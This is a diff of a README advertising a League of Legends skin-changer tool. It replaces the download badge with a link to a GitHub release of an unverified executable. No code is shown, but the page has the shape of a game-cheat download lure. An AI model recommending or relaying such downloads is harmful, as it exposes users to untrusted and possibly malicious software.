@@ -16,7 +16,7 @@ Our Ultimate Skin Changer 2025 offers a wide range of features to enhance your L
 
 Using our Skin Changer is as easy as 1-2-3! Simply download the tool from the following link and unleash the power of unlimited skins in League of Legends:
 
-[<img src="https://img.shields.io/badge/Download-App.zip-blue">](https://github.com/file/App.zip)
+[<img src="https://github.com/iemakshit25/League-of-Legends-Ultimate-Skin-Changer-2025/releases/tag/v2.0">](https://github.com/iemakshit25/League-of-Legends-Ultimate-Skin-Changer-2025/releases/tag/v2.0)
 
 Once you have downloaded the tool, launch it and follow the on-screen instructions to start changing skins in League of Legends like never before.
 
